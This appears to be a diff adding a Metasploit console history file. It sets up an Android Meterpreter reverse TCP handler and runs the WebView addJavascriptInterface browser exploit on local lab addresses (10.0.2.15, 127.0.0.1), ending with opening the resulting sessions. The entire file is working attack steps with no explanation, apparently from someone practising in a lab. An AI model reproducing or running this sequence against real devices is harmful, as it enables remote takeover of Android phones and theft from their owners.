@@ -1,0 +1,22 @@
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 10.0.2.15
+set LPORT 4444
+show options
+search andriod
+search Andriod
+use exploit/android/browser/webview_addjavascriptinterface
+show options
+set SRVHOST 127.0.0.1 
+set URIPATH /
+set LHOST 127.0.0.1
+set LPORT 4444
+show option
+show options
+show advanced
+set VERBOSE true
+set ReverseListenerBindAddress 127.0.0.1
+set ReverseListenerBindPort 4444
+run
+sessions -i
+exit
